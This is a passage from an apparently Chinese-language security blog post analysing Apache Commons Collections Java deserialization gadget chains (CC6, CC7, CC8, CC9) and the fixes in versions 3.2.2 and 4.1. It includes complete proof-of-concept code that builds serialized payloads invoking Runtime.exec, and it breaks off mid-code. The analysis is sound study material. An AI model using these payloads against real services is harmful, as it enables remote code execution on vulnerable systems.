ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(bos);</span><br><span class="line">        oos.writeObject(map);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(bos);</span><br><span class="line">        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> ByteArrayInputStream(bos.toByteArray()));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x6838;&#x5FC3;&#x662F;&#x5728;&#x8C03;&#x7528; <code>HashSet#readObject</code> &#x7684;&#x65F6;&#x5019;&#xFF0C;&#x8C03;&#x7528; map &#x7684; put &#x65B9;&#x6CD5;</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210211215727507.png" alt></p>
<p>&#x540E;&#x7EED;&#x8C03;&#x7528;&#x5230; <code>HashMap#put</code></p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210211215810147.png" alt></p>
<p>&#x4E4B;&#x540E;&#x4F1A;&#x8C03;&#x7528;&#x5230; <code>HashMap#hash</code></p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210211215837664.png" alt></p>
<p>&#x968F;&#x540E;&#x8C03;&#x7528;&#x5230; <code>TiedMapEntry.hashCode()</code></p>
<p>&#x5229;&#x7528;&#x94FE;</p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line">java.io.ObjectInputStream.readObject()</span><br><span class="line">       java.util.HashSet.readObject()</span><br><span class="line">           java.util.HashMap.put()</span><br><span class="line">           java.util.HashMap.hash()</span><br><span class="line">               org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class="line">               org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span><br><span class="line">                   org.apache.commons.collections.map.LazyMap.get()</span><br><span class="line">                       org.apache.commons.collections.functors.ChainedTransformer.transform()</span><br><span class="line">                       org.apache.commons.collections.functors.InvokerTransformer.transform()</span><br><span class="line">                       java.lang.reflect.Method.invoke()</span><br><span class="line">                           java.lang.Runtime.exec()</span><br></pre></td></tr></tbody></table></figure><p></p>
<h2 id="Simpler-Gadget-chain"><a href="#Simpler-Gadget-chain" class="headerlink" title="Simpler Gadget chain"></a>Simpler Gadget chain</h2><p>&#x7B80;&#x5316;&#x94FE;&#x4E2D;&#x7528;&#x5230;&#x4E86; <code>HashMap#readObject</code> &#x4E2D;&#x7684; hash &#x65B9;&#x6CD5;&#x6765;&#x89E6;&#x53D1; hashCode &#x65B9;&#x6CD5;</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210211222456810.png" alt></p>
<p>&#x8C03;&#x7528; hash &#x65B9;&#x6CD5;</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210211222523482.png" alt></p>
<p>&#x4EE4; key &#x4E3A;TiedMapEntry &#x5BF9;&#x8C61;&#xFF0C;&#x5373;&#x53EF;&#xFF0C;&#x8FD9;&#x91CC;&#x76F4;&#x63A5;&#x4F7F;&#x7528; @phithon &#x5E08;&#x5085;&#x7684;&#x4EE3;&#x7801;</p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CommonsCollections6</span> </span>{</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>{</span><br><span class="line">        Transformer[] fakeTransformers = <span class="hljs-keyword">new</span> Transformer[] {<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)};</span><br><span class="line">        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[] {</span><br><span class="line">                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[] { String.class,</span><br><span class="line">                        Class[].class }, <span class="hljs-keyword">new</span> Object[] { <span class="hljs-string">&quot;getRuntime&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>] }),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[] { Object.class,</span><br><span class="line">                        Object[].class }, <span class="hljs-keyword">new</span> Object[] { <span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>] }),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[] { String.class },</span><br><span class="line">                        <span class="hljs-keyword">new</span> String[] { <span class="hljs-string">&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span> }),</span><br><span class="line">                <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>),</span><br><span class="line">        };</span><br><span class="line">        Transformer transformerChain = <span class="hljs-keyword">new</span> ChainedTransformer(fakeTransformers);</span><br><span class="line"></span><br><span class="line">        <span class="hljs-comment">// &#x4E0D;&#x518D;&#x4F7F;&#x7528;&#x539F;CommonsCollections6&#x4E2D;&#x7684;HashSet&#xFF0C;&#x76F4;&#x63A5;&#x4F7F;&#x7528;HashMap</span></span><br><span class="line">        Map innerMap = <span class="hljs-keyword">new</span> HashMap();</span><br><span class="line">        Map outerMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">        TiedMapEntry tme = <span class="hljs-keyword">new</span> TiedMapEntry(outerMap, <span class="hljs-string">&quot;keykey&quot;</span>);</span><br><span class="line">        Map expMap = <span class="hljs-keyword">new</span> HashMap();</span><br><span class="line">        expMap.put(tme, <span class="hljs-string">&quot;valuevalue&quot;</span>);</span><br><span class="line">        outerMap.remove(<span class="hljs-string">&quot;keykey&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Field f = ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        f.set(transformerChain, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="hljs-comment">// ==================</span></span><br><span class="line">        <span class="hljs-comment">// &#x751F;&#x6210;&#x5E8F;&#x5217;&#x5316;&#x5B57;&#x7B26;&#x4E32;</span></span><br><span class="line">        ByteArrayOutputStream barr = <span class="hljs-keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(expMap);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="hljs-comment">// &#x672C;&#x5730;&#x6D4B;&#x8BD5;&#x89E6;&#x53D1;</span></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        Object o = (Object)ois.readObject();</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x8FD9;&#x91CC;&#x7684; key &#x7406;&#x8BBA;&#x4E0A;&#x662F;&#x6211;&#x4EEC;&#x6784;&#x9020;&#x597D;&#x7684; TiedMapEntry &#xFF0C;value &#x662F;&#x6211;&#x4EEC;&#x7B2C;&#x4E8C;&#x4E2A; HashMap put &#x8FDB;&#x53BB;&#x7684; &#x201C;value&#x201D; &#x5B57;&#x7B26;&#x4E32;</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210212163921869.png" alt></p>
<p>&#x540E;&#x7EED;&#x7684;&#x8C03;&#x7528;&#x5C31;&#x8DDF;&#x6211;&#x4EEC;&#x4E4B;&#x524D;&#x5206;&#x6790;&#x7684;&#x4E00;&#x6837;</p>
<p>JDK221 &#x4E0B;&#x8DDF; p&#x5E08;&#x5085;&#x539F;&#x6587;&#x7684;&#x4EE3;&#x7801;&#x4E0D;&#x4E00;&#x6837;&#xFF0C;&#x8FD9;&#x91CC;&#x662F; super.map&#xFF0C;&#x539F;&#x6587;&#x662F; map&#x3002;&#x4F46;&#x662F;&#x6309;&#x539F;&#x6587;&#x6B65;&#x9AA4;&#xFF0C;remove &#x4E4B;&#x540E;&#xFF0C;&#x7ED5;&#x4E0D;&#x8FC7;&#x8FD9;&#x4E2A;&#x5224;&#x65AD;&#xFF0C;&#x4E5F;&#x6CA1;&#x6709;&#x8C03;&#x7528;&#x5230; chain &#x7684;&#x94FE;&#xFF0C;&#x4F46;&#x662F;&#x8FD8;&#x662F;&#x80FD; RCE&#x3002;&#x7384;&#x5B66;</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210212165229612.png" alt></p>
<h1 id="CommonsCollections7"><a href="#CommonsCollections7" class="headerlink" title="CommonsCollections7"></a>CommonsCollections7</h1><h2 id="Basics-6"><a href="#Basics-6" class="headerlink" title="Basics"></a>Basics</h2><p>&#x56DE;&#x987E;&#x524D;&#x9762; <code>TiedMapEntry#getValue</code>  &#x7684;&#x8C03;&#x7528;&#x65B9;&#x5F0F;</p>
<p>&#x56DE;&#x987E; TiedMapEntry &#x91CC;&#x9762;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;CC5 &#x7528;&#x7684;&#x662F; <code>TiedMapEntry#toString</code>&#xFF0C;&#x91CC;&#x9762;&#x8C03;&#x7528;&#x4E86;<code>getValue</code>&#xFF0C;CC6 &#x7528;&#x7684;&#x662F; <code>TiedMapEntry#hashCode</code>&#xFF0C;&#x91CC;&#x9762;&#x8C03;&#x7528;&#x4E86;<code>getValue</code></p>
<p>CC7 &#x6CA1;&#x6709;&#x7EE7;&#x7EED;&#x5EF6;&#x7528; <code>TiedMapEntry</code> &#x7684;&#x65B9;&#x6CD5;&#x53BB;&#x8C03;&#x7528;&#xFF0C;&#x800C;&#x662F;&#x7528;&#x4E86; <code>AbstractMap#equals</code> &#x76F4;&#x63A5;&#x8C03;&#x7528;&#x4E86; <code>LazyMap#get</code></p>
<p>&#x6709;&#x51E0;&#x4E2A;&#x5C0F; trick</p>
<p><strong>yy &#x7684; hashCode &#x8DDF; zZ &#x7684; hashCode &#x76F8;&#x7B49;</strong></p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210212162614324.png" alt></p>
<h2 id="Gadget-chain-5"><a href="#Gadget-chain-5" class="headerlink" title="Gadget chain"></a>Gadget chain</h2><p><code>Hashtable#readObject</code> &#x7684; <code>reconstitutionPut</code> &#x662F;&#x6211;&#x4EEC;&#x7684;&#x5165;&#x53E3;&#x70B9;</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210212175610563.png" alt></p>
<p>&#x901A;&#x8FC7; <code>Hashtable#readObject</code> &#xFF0C;&#x6211;&#x4EEC;&#x77E5;&#x9053; key &#x8DDF; value &#x7684;&#x503C;&#x5C31;&#x662F;&#x6211;&#x4EEC;&#x4E4B;&#x524D; put &#x8FDB;&#x53BB;&#x7684;</p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line">hashtable.put(key, value);</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210212175740438.png" alt="image-20210212175740438"></p>
<p>&#x7B2C;&#x4E00;&#x6B21;&#x8C03;&#x7528; <code>Hashtable#reconstitutionPut</code> &#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4E0D;&#x4F1A;&#x8FDB;&#x5165;&#x5FAA;&#x73AF;&#xFF0C;&#x4F1A;&#x7ED9; <code>tab[index]</code> &#x521D;&#x59CB;&#x5316;&#x9644;&#x503C;</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210212181530639.png" alt></p>
<p>&#x7B2C;&#x4E8C;&#x6B21;&#x8C03;&#x7528;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x8C03;&#x7528;&#x5176; key &#x7684; <code>equals</code>&#xFF0C;&#x8FDB;&#x5165;&#x5176;  <code>equals</code> &#x65B9;&#x6CD5;&#x540E; <code>e.hash == hash</code> &#x9700;&#x8981;&#x524D;&#x540E; hash &#x503C;&#x76F8;&#x7B49;</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210212183042252.png" alt></p>
<p> <code>AbstractMapDecorator#equals</code>&#x8C03;&#x7528; map &#x7684;  <code>equals</code></p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210212183017632.png" alt="image-20210212183017632"></p>
<p><code>AbstractMap#equals</code> &#x8C03;&#x7528; m &#x7684; <code>get</code>&#xFF0C; &#x4E5F;&#x5C31;&#x662F; <code>LazyMap#get</code>&#xFF0C;&#x7531;&#x6B64;&#x89E6;&#x53D1; RCE</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210212183002189.png" alt></p>
<p>&#x6784;&#x9020; payload &#x7684;&#x65F6;&#x5019;&#x9700;&#x8981;&#x6CE8;&#x610F;&#x6700;&#x540E;&#x9700;&#x8981;&#x628A; lazyMap2 &#x7684; yy &#x952E; remove &#x6389;</p>
<p>&#x56E0;&#x4E3A; <code>hashtable.put(lazyMap2, 2);</code> &#x8FD9;&#x91CC;&#x5728;&#x8C03;&#x7528; put &#x65B9;&#x6CD5;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4E5F;&#x4F1A;&#x8C03;&#x7528;&#x5230; equals &#x65B9;&#x6CD5;&#xFF0C;&#x5C31;&#x4F1A;&#x589E;&#x52A0;&#x4E00;&#x4E2A;yy&#x952E;&#xFF0C;&#x4E3A;&#x4E86;&#x4FDD;&#x8BC1;&#x5176;&#x6B63;&#x5E38;&#x7684;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#xFF0C;&#x5C31;&#x8981;&#x79FB;&#x9664;&#x6389;</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210212201448996.png" alt></p>
<p><strong>CC7 payload</strong> </p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC7</span> </span>{</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, IllegalAccessException,</span></span><br><span class="line"><span class="hljs-function">            InvocationTargetException, InstantiationException, IOException, NoSuchFieldException </span>{</span><br><span class="line">        Transformer[] realPoc  = <span class="hljs-keyword">new</span> Transformer[]{</span><br><span class="line">                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class, Class[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{Object.class, Object[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{ (<span class="hljs-string">&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>)}),</span><br><span class="line">                <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)};</span><br><span class="line">        ChainedTransformer fakeChain = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]{</span><br><span class="line">                <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-string">&quot;random&quot;</span>)});</span><br><span class="line"></span><br><span class="line">        Map innerMap1 = <span class="hljs-keyword">new</span> HashMap();</span><br><span class="line">        Map innerMap2 = <span class="hljs-keyword">new</span> HashMap();</span><br><span class="line">        <span class="hljs-comment">// Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject</span></span><br><span class="line">        Map lazyMap1 = LazyMap.decorate(innerMap1, fakeChain);</span><br><span class="line">        lazyMap1.put(<span class="hljs-string">&quot;yy&quot;</span>, <span class="hljs-number">1</span>);</span><br><span class="line">        Map lazyMap2 = LazyMap.decorate(innerMap2, fakeChain);</span><br><span class="line">        lazyMap2.put(<span class="hljs-string">&quot;zZ&quot;</span>, <span class="hljs-number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="hljs-comment">// Use the colliding Maps as keys in Hashtable</span></span><br><span class="line">        Hashtable hashtable = <span class="hljs-keyword">new</span> Hashtable();</span><br><span class="line">        hashtable.put(lazyMap1, <span class="hljs-number">1</span>);</span><br><span class="line">        hashtable.put(lazyMap2, <span class="hljs-number">2</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Field f = ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        f.set(fakeChain, realPoc);</span><br><span class="line"></span><br><span class="line">        lazyMap2.remove(<span class="hljs-string">&quot;yy&quot;</span>);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream bos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(bos);</span><br><span class="line">        oos.writeObject(hashtable);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(bos);</span><br><span class="line">        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> ByteArrayInputStream(bos.toByteArray()));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x5229;&#x7528;&#x94FE;</p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line">Payload method chain:</span><br><span class="line"></span><br><span class="line">java.util.Hashtable.readObject</span><br><span class="line">java.util.Hashtable.reconstitutionPut</span><br><span class="line">org.apache.commons.collections.map.AbstractMapDecorator.equals</span><br><span class="line">java.util.AbstractMap.equals</span><br><span class="line">org.apache.commons.collections.map.LazyMap.get</span><br><span class="line">org.apache.commons.collections.functors.ChainedTransformer.transform</span><br><span class="line">org.apache.commons.collections.functors.InvokerTransformer.transform</span><br><span class="line">java.lang.reflect.Method.invoke</span><br><span class="line">sun.reflect.DelegatingMethodAccessorImpl.invoke</span><br><span class="line">sun.reflect.NativeMethodAccessorImpl.invoke</span><br><span class="line">sun.reflect.NativeMethodAccessorImpl.invoke0</span><br><span class="line">java.lang.Runtime.exec</span><br></pre></td></tr></tbody></table></figure><p></p>
<h1 id="Commons-Collections-Version"><a href="#Commons-Collections-Version" class="headerlink" title="Commons Collections Version"></a>Commons Collections Version</h1><h2 id="Commons-Collections-3-2-2-Fix"><a href="#Commons-Collections-3-2-2-Fix" class="headerlink" title="Commons Collections 3.2.2 Fix"></a>Commons Collections 3.2.2 Fix</h2><p>3.2.2 &#x7248;&#x672C;&#x4F7F;&#x7528;&#x4E86;&#x9ED1;&#x540D;&#x5355;&#xFF0C;&#x7981;&#x6B62;&#x4E86; InvokerTransformer &#x7C7B;&#x5728;&#x5E8F;&#x5217;&#x5316;&#x548C;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x4F7F;&#x7528;</p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">writeObject</span><span class="hljs-params">(ObjectOutputStream os)</span> <span class="hljs-keyword">throws</span> IOException </span>{</span><br><span class="line">    FunctorUtils.checkUnsafeSerialization(class$org$apache$commons$collections$functors$InvokerTransformer == null ? (class$org$apache$commons$collections$functors$InvokerTransformer = class$(&quot;org.apache.commons.collections.functors.InvokerTransformer&quot;)) : class$org$apache$commons$collections$functors$InvokerTransformer);</span><br><span class="line">    os.defaultWriteObject();</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(ObjectInputStream is)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, IOException </span>{</span><br><span class="line">    FunctorUtils.checkUnsafeSerialization(class$org$apache$commons$collections$functors$InvokerTransformer == null ? (class$org$apache$commons$collections$functors$InvokerTransformer = class$(&quot;org.apache.commons.collections.functors.InvokerTransformer&quot;)) : class$org$apache$commons$collections$functors$InvokerTransformer);</span><br><span class="line">    is.defaultReadObject();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<h2 id="Commons-Collections-4-1-Fix"><a href="#Commons-Collections-4-1-Fix" class="headerlink" title="Commons Collections 4.1 Fix"></a>Commons Collections 4.1 Fix</h2><p>4.1 InvokerTransformer &#x548C; InstantiateTransformer &#x4E24;&#x4E2A;&#x7C7B;&#x90FD;&#x6CA1;&#x6709;&#x5B9E;&#x73B0; Serializable &#x63A5;&#x53E3;</p>
<p><code>org.apache.commons.collections4.functors.InvokerTransformer</code></p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210212211823221.png" alt></p>
<p><code>org.apache.commons.collections4.functors.InstantiateTransformer</code></p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210212211841160.png" alt></p>
<h1 id="More-Gadget-Chain"><a href="#More-Gadget-Chain" class="headerlink" title="More Gadget Chain"></a>More Gadget Chain</h1><h2 id="CommonsCollections8"><a href="#CommonsCollections8" class="headerlink" title="CommonsCollections8"></a>CommonsCollections8</h2><p>&#x5206;&#x6790;&#x89C1;&#x8FD9;&#x7BC7;&#x6587;&#x7AE0;&#xFF1A;<a href="https://www.anquanke.com/post/id/190472#h3-4" target="_blank" rel="noopener">https://www.anquanke.com/post/id/190472#h3-4</a></p>
<blockquote>
<p>CommonsCollections8&#x662F;&#x4ECA;&#x5E74;<strong><a href="https://github.com/navalorenzo" target="_blank" rel="noopener">navalorenzo</a></strong>&#x63A8;&#x9001;&#x5230;ysoserial&#x4E0A;&#x7684;&#xFF0C;8&#x4E0E;2&#xFF0C;4&#x7684;&#x533A;&#x522B;&#x5728;&#x4E8E;&#x4F7F;&#x7528;&#x4E86;&#x65B0;&#x7684;readObject&#x89E6;&#x53D1;&#x70B9;<code>TreeBag</code></p>
</blockquote>
<p><code>TreeBag#readObject</code></p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210213152550114.png" alt></p>
<p>&#x8C03;&#x7528;&#x7236;&#x7C7B;&#x7684; <code>doReadObject</code></p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210213152630578.png" alt></p>
<p>&#x8C03;&#x7528;&#x5176; <code>map</code> &#x7684; <code>put</code></p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210213152729420.png" alt></p>
<p>&#x540E;&#x7EED;&#x5C31;&#x662F; CC2 &#x4E2D;&#x5229;&#x7528; compare &#x7684;&#x601D;&#x8DEF;&#x4E86;</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210213152823836.png" alt></p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line">TreeBag.readObject()</span><br><span class="line">    -&gt; AbstractMapBag.doReadObject()</span><br><span class="line">    -&gt; TreeMap.put()</span><br><span class="line">    -&gt; TransformingComparator.compare()</span><br><span class="line">    -&gt; InvokerTransformer.transform()</span><br><span class="line">    -&gt; TemplatesImpl.newTransformer()</span><br><span class="line">    ... templates Gadgets ...</span><br><span class="line">    -&gt; Runtime.getRuntime().exec()</span><br></pre></td></tr></tbody></table></figure><p></p>
<h2 id="CommonsCollections9"><a href="#CommonsCollections9" class="headerlink" title="CommonsCollections9"></a>CommonsCollections9</h2><p>&#x7ED3;&#x5408; <a href="https://github.com/frohoff/ysoserial/pulls" target="_blank" rel="noopener">ysoserial Pull requests</a> &#x770B;&#x4E00;&#x4E0B;&#x5176;&#x4ED6;&#x7684; gadget</p>
<p>@&#x6885;&#x5B50;&#x9152;&#x5E08;&#x5085;&#x7684; <a href="https://github.com/frohoff/ysoserial/pull/125" target="_blank" rel="noopener">CommonsCollections9</a></p>
<p>&#x4E3B;&#x8981;&#x5229;&#x7528;&#x7684;&#x662F;CommonsCollections:3.2&#x7248;&#x672C;&#x65B0;&#x589E;&#x7684; DefaultedMap &#x6765;&#x4EE3;&#x66FF; LazyMap</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210212210310039.png" alt></p>
<p>RCE demo</p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CommandDemo</span> </span>{</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException,</span></span><br><span class="line"><span class="hljs-function">            IllegalAccessException, InvocationTargetException, InstantiationException </span>{</span><br><span class="line">        ChainedTransformer chainDemo = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]{</span><br><span class="line">                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class, Class[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]}),</span><br><span 